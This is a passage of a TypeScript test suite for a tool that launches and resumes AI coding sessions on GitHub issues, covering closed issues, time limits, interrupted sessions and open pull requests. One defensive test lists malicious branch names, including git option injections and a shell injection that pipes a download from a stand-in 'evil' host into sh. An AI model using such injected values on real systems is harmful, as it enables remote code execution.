      const { tracker, calls } = fakeTracker({ issues: [detail("ready", [], true)] });
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(start(ctxFor(dataDir, tracker, t3.sessions), 7));
      assert.ok(isGateRunning(error));
      assert.deepStrictEqual(error.run, two);
      assert.deepStrictEqual(calls, ["issue 7"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.strictEqual(isFinished(dataDir, one), false);
      assert.strictEqual(isFinished(dataDir, two), false);
    }),
  );

  it.effect("leaves a pr-open run and a run whose own merge closed it alone", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const open = sessionRun(dataDir, 1, "pr-open", { thread: "thread-1", pr: 12 });
      const merged = sessionRun(dataDir, 2, "building", { thread: "thread-2", pr: 13 });
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready", [], true)],
        pulls: { 13: pullOf(13) },
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* start(ctxFor(dataDir, tracker, t3.sessions), 7);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "issue #7 is closed",
        moved: "closed",
      });
      // The pr-open run is not read at all; the building one is asked about its pull request.
      assert.deepStrictEqual(calls, ["issue 7", "pullRequest 13"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.strictEqual(isFinished(dataDir, open), false);
      assert.strictEqual(isFinished(dataDir, merged), false);
    }),
  );

  it.effect("ends a run whose pull request was closed unmerged", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const one = sessionRun(dataDir, 1, "building", { thread: "thread-1", pr: 12 });
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready", [], true)],
        pulls: { 12: pullOf(12, { merged: false }) },
      });
      const outcome = yield* start(ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions), 7);
      assert.deepStrictEqual(outcome, { kind: "abandoned", mayHaveSession: [] });
      assert.deepStrictEqual(calls, ["issue 7", "pullRequest 12", "closedBy 7"]);
      assert.deepStrictEqual(finishedOf(dataDir, one).data, FINISHED_SEEDED);
    }),
  );

  it.effect("with a launch sent and no thread recorded says a session may exist", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const sent = sessionRun(dataDir, 1, "triage", { launchSent: true });
      const never = sessionRun(dataDir, 2, "triage");
      const { tracker } = fakeTracker({ issues: [detail("ready", [], true)] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* start(ctxFor(dataDir, tracker, t3.sessions), 7);
      // Only the run that sent a launch may have a session; neither has a thread to archive.
      assert.deepStrictEqual(outcome, { kind: "abandoned", mayHaveSession: [sent] });
      assert.deepStrictEqual(t3.calls, []);
      assert.strictEqual(isFinished(dataDir, sent), true);
      assert.strictEqual(isFinished(dataDir, never), true);
    }),
  );

  it.effect("leaves the actor out when GitHub names none or cannot be asked", () =>
    Effect.gen(function* () {
      for (const closedBy of [null, ghFailure()]) {
        const dataDir = tempDir();
        const one = sessionRun(dataDir, 1, "triage", { thread: "thread-1" });
        const { tracker } = fakeTracker({ issues: [detail("ready", [], true)], closedBy });
        const outcome = yield* start(
          ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions),
          7,
        );
        assert.strictEqual(outcome.kind, "abandoned");
        assert.deepStrictEqual(finishedOf(dataDir, one).cause, makeCause("start", "issue-closed"));
      }
    }),
  );

  it.effect("whose archive fails is an error with nothing written, and the next call ends it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const one = sessionRun(dataDir, 1, "triage", { thread: "thread-1" });
      const before = entriesOf(dataDir, one);
      const failing = fakeSessions(dataDir, { archive: [sessionsError("archive", "boom")] });
      const first = fakeTracker({ issues: [detail("ready", [], true)] });
      const error = yield* Effect.flip(start(ctxFor(dataDir, first.tracker, failing.sessions), 7));
      assert.strictEqual(error._tag, "FactorySessionsError");
      assert.deepStrictEqual(entriesOf(dataDir, one), before);
      const again = fakeTracker({ issues: [detail("ready", [], true)] });
      const outcome = yield* start(
        ctxFor(dataDir, again.tracker, fakeSessions(dataDir, {}).sessions),
        7,
      );
      assert.strictEqual(outcome.kind, "abandoned");
      assert.strictEqual(isFinished(dataDir, one), true);
    }),
  );

  it.effect("whose later run fails to end still names the runs it ended, with the error", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const sent = sessionRun(dataDir, 1, "triage", { launchSent: true });
      const two = sessionRun(dataDir, 2, "triage", { thread: "thread-2" });
      const before = entriesOf(dataDir, two);
      const failing = fakeSessions(dataDir, { archive: [sessionsError("archive", "boom")] });
      const { tracker } = fakeTracker({ issues: [detail("ready", [], true)] });
      const outcome = yield* start(ctxFor(dataDir, tracker, failing.sessions), 7);
      if (outcome.kind !== "abandoned") return assert.fail(`not abandoned: ${outcome.kind}`);
      // The first run is finished, so this is the only place its session can still be named.
      assert.deepStrictEqual(outcome.mayHaveSession, [sent]);
      assert.strictEqual(outcome.error?._tag, "FactorySessionsError");
      assert.strictEqual(isFinished(dataDir, sent), true);
      assert.deepStrictEqual(entriesOf(dataDir, two), before);
    }),
  );
});

const run7n = (attempt: number): RunId => ({ ...run7, attempt });
const TIME_LIMIT_TEXT = "the run passed its time limit";
const RESUME_WORDS =
  "A previous attempt of this issue (rawphp__softfac__7__1) stopped at its time limit. The worktree already holds its commits: continue from them, do not start over.";
const INTERRUPTED_WORDS =
  "A previous attempt of this issue (rawphp__softfac__7__1) was interrupted when T3 Code lost its session. The worktree already holds its commits: continue from them, do not start over.";

/** `startedLines()` with `branch` on the `session_launched` line. */
const startedLinesOn = (branch: string | null) =>
  startedLines().map((entry) =>
    entry.line.event === "session_launched"
      ? {
          ...entry,
          line: {
            event: "session_launched",
            data: {
              thread_id: "thread-1",
              worktree: WORKTREE,
              branch,
              model_instance: "claudeAgent",
              model: "claude-opus-5-5",
              model_options: null,
              resumed_from: null,
              title: "Build step",
            },
          } satisfies RunEvent,
        }
      : entry,
  );

/** Run 1 of issue 7: started, then stuck for the reason code `code` and finished. */
const seedStuckRun = (
  dataDir: string,
  code: string,
  branches: { launched: string | null; recorded: string | null },
  options: { attempt?: number; resumedFrom?: { run: string; branch: string } } = {},
) => {
  const attempt = options.attempt ?? 1;
  const ledger = Ledger.create(dataDir, run7n(attempt), { clock: () => T0 - 1000 + attempt });
  try {
    for (const { line, cause: why } of startedLinesOn(branches.launched)) {
      const resumed =
        line.event === "session_launched" && options.resumedFrom !== undefined
          ? { ...line, data: { ...line.data, resumed_from: options.resumedFrom } }
          : line;
      ledger.append(resumed, why);
    }
    const why = makeCause("pass", code);
    ledger.append(
      {
        event: "stuck",
        data: {
          reason: TIME_LIMIT_TEXT,
          ...(branches.recorded !== null && { branch: branches.recorded, commits_ahead: 2 }),
        },
      },
      why,
    );
    ledger.append({ event: "state_changed", data: { from: "building", to: "stuck" } }, why);
    ledger.finish("stuck", null, null, why);
  } finally {
    ledger.close();
  }
};

/** Run 2 of issue 7 holding `lines`, as a pass cut short left it. */
const seedSecondRun = (dataDir: string, lines: ReadonlyArray<{ line: RunEvent; cause: Cause }>) => {
  const ledger = Ledger.create(dataDir, run7n(2), { clock: () => T0 - 500 });
  try {
    for (const { line, cause: why } of lines) ledger.append(line, why);
  } finally {
    ledger.close();
  }
};

const GH_CALLS = /^(branchTip|textEditedSince) /;
const lookups = (calls: ReadonlyArray<string>) => calls.filter((c) => GH_CALLS.test(c));

const launchLineOf = (dataDir: string) => {
  const found = entriesOf(dataDir, run7n(2)).find((e) => e.event === "session_launched");
  if (found === undefined) return assert.fail("run 2 launched no session");
  return found;
};

/** The last launch was a plain start from `main`, and its line says so. */
const assertPlainStart = (dataDir: string, t3: ReturnType<typeof fakeSessions>) => {
  const request = t3.launchRequests.at(-1)!;
  assert.strictEqual(request.baseRef, "main");
  assert.strictEqual(request.pullRequestUrl, undefined);
  assert.strictEqual(request.message, launchMessage(REPO, 7, USER));
  const line = launchLineOf(dataDir);
  assert.strictEqual((line.data as { resumed_from: unknown }).resumed_from, null);
  assert.strictEqual(line.cause?.reason, "session-launched");
};

describe("start: the resume after a time limit", () => {
  it.effect("starts from base after a run whose interruption was resumed in its own thread", () =>
    Effect.gen(function* () {
      // Attempt 1 resumed from an earlier branch, was interrupted and resumed in place, then
      // ended badly: only a relaunch or a time limit leaves work to continue from.
      const dataDir = tempDir();
      const ledger = Ledger.create(dataDir, run7, { clock: () => T0 - 1000 });
      try {
        for (const { line, cause: why } of startedLinesOn("t3code/abc")) {
          ledger.append(
            line.event === "session_launched"
              ? {
                  ...line,
                  data: { ...line.data, resumed_from: { run: "x", branch: "t3code/old" } },
                }
              : line,
            why,
          );
        }
        const why = makeCause("advance", "session-ended-badly");
        ledger.append(
          {
            event: "session_interrupted",
            data: {
              resumes: 1,
              relaunch: false,
              run_ordinal: 1,
              branch: "t3code/abc",
              t3_error: null,
              ended_in_pass: 2,
            },
          },
          makeCause("advance", "session-interrupted"),
        );
        ledger.append({ event: "state_changed", data: { from: "building", to: "stuck" } }, why);
        ledger.finish("stuck", null, null, why);
      } finally {
        ledger.close();
      }
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertPlainStart(dataDir, t3);
      assert.deepStrictEqual(lookups(calls), []);
    }),
  );

  it.effect("of a resumed run falls back to the branch its session was told to push to", () =>
    Effect.gen(function* () {
      // Attempt 2 resumed from attempt 1's `t3code/abc` and pushed there; T3 named its own
      // branch, which the stuck line recorded and which never reached origin.
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      seedStuckRun(
        dataDir,
        "time-limit",
        { launched: null, recorded: "t3code/own" },
        { attempt: 2, resumedFrom: { run: "rawphp__softfac__7__1", branch: "t3code/abc" } },
      );
      const { tracker, calls } = fakeTracker({ missingBranches: ["t3code/own"] });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.commandId, "softfac:rawphp__softfac__7__3:launch");
      assert.strictEqual(request.pullRequestUrl, undefined);
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.ok(request.message.includes("git push origin HEAD:t3code/abc"), request.message);
      assert.deepStrictEqual(lookups(calls), [
        `textEditedSince 7 ${LABELED}`,
        "branchTip t3code/own",
        "branchTip t3code/abc",
      ]);
    }),
  );

  it.effect("of a resumed run continues from T3's own branch when origin has it", () =>
    Effect.gen(function* () {
      // A version before the push words launched attempt 2, whose session pushed T3's branch.
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      seedStuckRun(
        dataDir,
        "time-limit",
        { launched: null, recorded: "t3code/own" },
        { attempt: 2, resumedFrom: { run: "rawphp__softfac__7__1", branch: "t3code/abc" } },
      );
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/own");
      assert.deepStrictEqual(lookups(calls), [
        `textEditedSince 7 ${LABELED}`,
        "branchTip t3code/own",
      ]);
    }),
  );

  it.effect("continues from the branch an earlier time-limited run left on origin", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.commandId, "softfac:rawphp__softfac__7__2:launch");
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.strictEqual(
        request.message,
        launchMessage(REPO, 7, USER, {
          run: run7,
          branch: "t3code/abc",
          after: "time-limit",
        }),
      );
      assert.ok(request.message.includes(RESUME_WORDS), request.message);
      assert.ok(request.message.startsWith("/factory rawphp/softfac#7\n\n"), request.message);
      // The ledger shows the choice, on the launch line and as its reason.
      const line = launchLineOf(dataDir);
      assert.deepStrictEqual((line.data as { resumed_from: unknown }).resumed_from, {
        run: "rawphp__softfac__7__1",
        branch: "t3code/abc",
      });
      assert.strictEqual(line.cause?.reason, "resumed-from-branch");
      // The text was checked against the earlier approval, and the branch against origin.
      assert.deepStrictEqual(lookups(calls), [
        `textEditedSince 7 ${LABELED}`,
        "branchTip t3code/abc",
      ]);
    }),
  );

  it.effect("continues from the branch a relaunch after an interruption left", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const ledger = Ledger.create(dataDir, run7, { clock: () => T0 - 1000 });
      try {
        for (const { line, cause: why } of startedLinesOn(null)) ledger.append(line, why);
        const why = makeCause("advance", "session-interrupted");
        ledger.append(
          {
            event: "session_interrupted",
            data: {
              resumes: 1,
              relaunch: true,
              run_ordinal: null,
              branch: "t3code/abc",
              t3_error: null,
              ended_in_pass: 2,
            },
          },
          why,
        );
        ledger.finish("stuck", null, null, why);
      } finally {
        ledger.close();
      }
      const { tracker } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.ok(request.message.includes(INTERRUPTED_WORDS), request.message);
      assert.strictEqual(launchLineOf(dataDir).cause?.reason, "resumed-from-branch");
    }),
  );

  it.effect("is not made after an interruption's relaunch that then asked questions", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const ledger = Ledger.create(dataDir, run7, { clock: () => T0 - 1000 });
      try {
        for (const { line, cause: why } of startedLinesOn(null)) ledger.append(line, why);
        const why = makeCause("advance", "session-interrupted");
        ledger.append(
          {
            event: "session_interrupted",
            data: {
              resumes: 1,
              relaunch: true,
              run_ordinal: null,
              branch: "t3code/abc",
              t3_error: null,
              ended_in_pass: 2,
            },
          },
          why,
        );
        ledger.append({ event: "questions_posted", data: { questions: "1. Which?" } }, why);
        ledger.append(
          { event: "state_changed", data: { from: "building", to: "needs-info" } },
          why,
        );
        ledger.finish("needs-info", null, null, why);
      } finally {
        ledger.close();
      }
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("reads the branch from the stuck line when the launch line has none", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: null, recorded: "t3code/abc" });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, fakeTracker({}).tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/abc");
    }),
  );

  it.effect("prefers the branch on the launch line", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/launched", recorded: "t3code/abc" });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, fakeTracker({}).tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/launched");
    }),
  );

  it.effect("starts from base when the branch is not on origin", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const { tracker, calls } = fakeTracker({ branchTip: "missing" });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.ok(calls.includes("branchTip t3code/abc"), calls.join("\n"));
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("is an error that leaves the issue in triage when the branch cannot be looked up", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const script = {
        issues: [detail("ready"), detail("triage", [USER])],
        branchTip: ghFailure(),
      };
      const { tracker, calls } = fakeTracker(script);
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(
        t3.calls.filter((c) => c.startsWith("launch ")),
        [],
      );
      assert.ok(!calls.includes("setState 7 building"), calls.join("\n"));
      assert.ok(
        !stepsOf(dataDir, run7n(2)).includes("session_launched"),
        stepsOf(dataDir, run7n(2)).join(","),
      );
      // The next pass picks the run up again, and launches once GitHub answers.
      delete (script as { branchTip?: unknown }).branchTip;
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests.at(-1)!.baseRef, "t3code/abc");
    }),
  );

  it.effect("writes no launch-sending step when GitHub fails while deciding", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const { tracker } = fakeTracker({ branchTip: ghFailure() });
      yield* Effect.flip(startIn(dataDir, tracker));
      const sending = entriesOf(dataDir, run7n(2)).filter(
        (e) =>
          e.event === "step_changed" &&
          String((e.data as { step: string }).step).startsWith("launch-sending"),
      );
      assert.deepStrictEqual(sending, []);
    }),
  );

  it.effect("is an error that leaves the issue in triage when the issue text cannot be read", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const script: { issues: Array<IssueDetail>; editedSince: boolean | GitHubError } = {
        issues: [detail("ready"), detail("triage", [USER])],
        editedSince: ghFailure(),
      };
      const { tracker, calls } = fakeTracker(script);
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      // The text read is the one lookup made; nothing is launched and no decision is written.
      assert.deepStrictEqual(lookups(calls), [`textEditedSince 7 ${LABELED}`]);
      assert.deepStrictEqual(
        t3.calls.filter((c) => c.startsWith("launch ")),
        [],
      );
      assert.ok(!calls.includes("setState 7 building"), calls.join("\n"));
      assert.deepStrictEqual(
        entriesOf(dataDir, run7n(2)).filter(
          (e) =>
            e.event === "step_changed" &&
            String((e.data as { step: string }).step).startsWith("launch-sending"),
        ),
        [],
      );
      assert.ok(
        !stepsOf(dataDir, run7n(2)).includes("session_launched"),
        stepsOf(dataDir, run7n(2)).join(","),
      );
      // The next pass picks the run up again, and resumes once GitHub answers.
      script.editedSince = false;
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests.at(-1)!.baseRef, "t3code/abc");
    }),
  );

  it.effect("is not made when the earlier run stopped for another reason", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "session-stuck", { launched: "t3code/abc", recorded: "t3code/abc" });
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("is not made when the issue text changed since the earlier approval", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      const { tracker, calls } = fakeTracker({ editedSince: true });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), [`textEditedSince 7 ${LABELED}`]);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("is not made when the earlier run recorded no branch", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: null, recorded: null });
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("is not made from a branch name that could be taken for a git option", () =>
    Effect.gen(function* () {
      for (const branch of [
        "-upload-pack=x",
        "--force",
        "a b",
        "a..b",
        "a\u0001b",
        "",
        "t3/x;$(curl evil|sh)",
        "t3/x`y`",
        "t3/x|y",
      ]) {
        const dataDir = tempDir();
        seedStuckRun(dataDir, "time-limit", { launched: null, recorded: branch });
        const { tracker, calls } = fakeTracker({});
        const t3 = fakeSessions(dataDir, {});
        yield* startIn(dataDir, tracker, t3.sessions);
        assert.deepStrictEqual(lookups(calls), [], JSON.stringify(branch));
        assertPlainStart(dataDir, t3);
      }
    }),
  );

  it.effect("records the decision in the launch-sending step, before the launch is sent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      yield* startIn(dataDir, fakeTracker({}).tracker);
      const events = entriesOf(dataDir, run7n(2));
      const sending = events.findIndex(
        (e) =>
          e.event === "step_changed" &&
          String((e.data as { step: string }).step).startsWith("launch-sending"),
      );
      assert.deepStrictEqual(events[sending]!.data, {
        step: "launch-sending resumed-from t3code/abc",
      });
      assert.strictEqual(events[sending + 1]!.event, "session_launched");
    }),
  );

  it.effect("sent again, reuses the recorded decision and asks GitHub nothing", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      seedSecondRun(dataDir, [
        ...startedLines().slice(0, 3),
        {
          line: { event: "step_changed", data: { step: "launch-sending resumed-from t3code/abc" } },
          cause: cause("launch-sending"),
        },
      ]);
      // The branch is gone and the text edited since the first send: the retry sends the same request.
      const { tracker, calls } = fakeTracker({
        issues: [detail("triage", [USER])],
        branchTip: "missing",
        editedSince: true,
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.ok(request.message.includes(RESUME_WORDS), request.message);
      assert.deepStrictEqual(lookups(calls), []);
      const line = launchLineOf(dataDir);
      assert.deepStrictEqual((line.data as { resumed_from: unknown }).resumed_from, {
        run: "rawphp__softfac__7__1",
        branch: "t3code/abc",
      });
      assert.strictEqual(line.cause?.reason, "resumed-from-branch");
    }),
  );

  it.effect("sent again after a plain start, stays plain though a resume is now possible", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedStuckRun(dataDir, "time-limit", { launched: "t3code/abc", recorded: "t3code/abc" });
      seedSecondRun(dataDir, startedLines().slice(0, 4));
      const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER])] });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("a first attempt is a plain start", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.baseRef, "main");
      assert.strictEqual(request.pullRequestUrl, undefined);
    }),
  );
});

const URL12 = "https://github.com/rawphp/softfac/pull/12";
const PR_OPENED_12: RunEvent = { event: "pr_opened", data: { pr: 12, url: URL12 } };
const EXISTING_PR_WORDS = "Do not open another pull request.";

/** An open draft on `head` into `main`, as `pullRequest` reads it. */
const openDraft = (head: string): PullRequest => ({
  number: 12,
  isDraft: true,
  open: true,
  merged: false,
  headRef: head,
  crossRepository: false,
  baseRef: "main",
  headSha: "a".repeat(40),
  mergeable: "mergeable",
  createdAt: "2026-10-04T10:00:00Z",
});

/** An open draft by the factory on `head` into `main`, as GitHub's closing references list it. */
const closingDraft = (head: string, over: Partial<OpenPullRequest> = {}): OpenPullRequest => ({
  number: 12,
  url: URL12,
  headRef: head,
  baseRef: "main",
  crossRepository: false,
  author: USER,
  ...over,
});

/**
 * Run 1 of issue 7: started on `t3code/abc`, reported pull request #12 (`pr_opened`), or left it
 * open when it stopped (`pr_left`), then ended with `outcome`: `needs-info`, or stuck for the
 * reason code `code`.
 */
const seedEndedWithPr = (
  dataDir: string,
  ending: { outcome: "needs-info" } | { outcome: "stuck"; code: string },
  options: { attempt?: number; pr?: "opened" | "left" | false } = {},
) => {
  const ledger = Ledger.create(dataDir, run7n(options.attempt ?? 1), { clock: () => T0 - 1000 });
  try {
    for (const { line, cause: why } of startedLinesOn("t3code/abc")) ledger.append(line, why);
    const why = makeCause("advance", ending.outcome === "stuck" ? ending.code : "questions-asked");
    if (options.pr === "left") {
      ledger.append(
        { event: "pr_left", data: { pr: 12, url: URL12 } },
        makeCause("advance", "pr-left"),
      );
    } else if (options.pr !== false) {
      ledger.append(PR_OPENED_12, makeCause("advance", "pr-opened"));
    }
    if (ending.outcome === "needs-info") {
      ledger.append({ event: "questions_posted", data: { questions: "1. Which?" } }, why);
      ledger.append({ event: "state_changed", data: { from: "building", to: "needs-info" } }, why);
      ledger.finish("needs-info", null, null, why);
    } else {
      ledger.append(
        {
          event: "stuck",
          data: {
            reason: ending.code === "time-limit" ? TIME_LIMIT_TEXT : "the session said stuck",
            branch: "t3code/abc",
            commits_ahead: 2,
          },
        },
        why,
      );
      ledger.append({ event: "state_changed", data: { from: "building", to: "stuck" } }, why);
      ledger.finish("stuck", null, null, why);
    }
  } finally {
    ledger.close();
  }
};

const prLookups = (calls: ReadonlyArray<string>) =>
  calls.filter((c) => /^(openPullRequestsClosing|pullRequest) /.test(c));

/**
 * The last launch (attempt 2) resumed onto pull request #12 on `t3code/abc`, and its lines say so.
 * The launch line names the run itself: like a re-gate's session, this one pushes to the pull
 * request's branch.
 */
const assertResumedOntoPr = (dataDir: string, t3: ReturnType<typeof fakeSessions>) => {
  const request = t3.launchRequests.at(-1)!;
  assert.strictEqual(request.baseRef, "t3code/abc");
  assert.strictEqual(request.pullRequestUrl, URL12);
  assert.strictEqual(
    request.message,
    launchMessage(REPO, 7, USER, {
      after: "existing-pr",
      branch: "t3code/abc",
      prUrl: URL12,
    }),
  );
  assert.ok(request.message.includes(EXISTING_PR_WORDS), request.message);
  assert.ok(request.message.includes("git push origin HEAD:t3code/abc"), request.message);
  const line = launchLineOf(dataDir);
  assert.deepStrictEqual((line.data as { resumed_from: unknown }).resumed_from, {
    run: "rawphp__softfac__7__2",
    branch: "t3code/abc",
  });
  assert.strictEqual(line.cause?.reason, "resumed-from-branch");
  // The pull request in a step of its own just before the one an older version also reads.
  const steps = entriesOf(dataDir, run7n(2))
    .filter((e) => e.event === "step_changed")
    .map((e) => String((e.data as { step: string }).step))
    .filter((step) => step.startsWith("launch-"));
  assert.deepStrictEqual(steps, [
    `launch-pull-request t3code/abc ${URL12}`,
    "launch-sending resumed-from t3code/abc",
  ]);
};

describe("start: the resume onto an open pull request of an earlier attempt", () => {
  it.effect("after needs-info, continues the pull request the earlier run's ledger names", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      const { tracker, calls } = fakeTracker({ pulls: { 12: openDraft("t3code/abc") } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
      // The ledger's pull request is read from GitHub; its closing references are not needed.
      assert.deepStrictEqual(prLookups(calls), ["pullRequest 12"]);
      // Neither the branch nor the text is asked about: the open pull request is the work.
      assert.deepStrictEqual(lookups(calls), []);
    }),
  );

  it.effect("after a session that said stuck, continues its pull request", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "stuck", code: "session-stuck" });
      const { tracker } = fakeTracker({ pulls: { 12: openDraft("t3code/abc") } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
    }),
  );

  it.effect("continues the pull request a stopping session left open", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "stuck", code: "session-stuck" }, { pr: "left" });
      const { tracker, calls } = fakeTracker({ pulls: { 12: openDraft("t3code/abc") } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
      assert.deepStrictEqual(prLookups(calls), ["pullRequest 12"]);
    }),
  );

  it.effect(
    "is an error that leaves the issue in triage when GitHub cannot read the ledger's pull request",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        seedEndedWithPr(dataDir, { outcome: "needs-info" });
        const { tracker, calls } = fakeTracker({ pulls: { 12: ghFailure() } });
        const t3 = fakeSessions(dataDir, {});
        const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
        assert.strictEqual(error._tag, "GitHubFailed");
        assert.deepStrictEqual(t3.launchRequests, []);
        // Never a fall-through to a start from base beside the pull request.
        assert.ok(!calls.includes("openPullRequestsClosing 7"), calls.join("\n"));
        assert.ok(!calls.some((c) => c.startsWith("setState 7 building")), calls.join("\n"));
      }),
  );

  it.effect("after a time limit, the pull request wins over the branch", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "stuck", code: "time-limit" });
      const { tracker } = fakeTracker({ pulls: { 12: openDraft("t3code/abc") } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
      assert.ok(!t3.launchRequests[0]!.message.includes(RESUME_WORDS));
    }),
  );

  it.effect("is made even when the issue text changed since the earlier approval", () =>
    Effect.gen(function* () {
      // A changed text starts the work over, but on the same pull request: never a second one.
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      const { tracker } = fakeTracker({
        pulls: { 12: openDraft("t3code/abc") },
        editedSince: true,
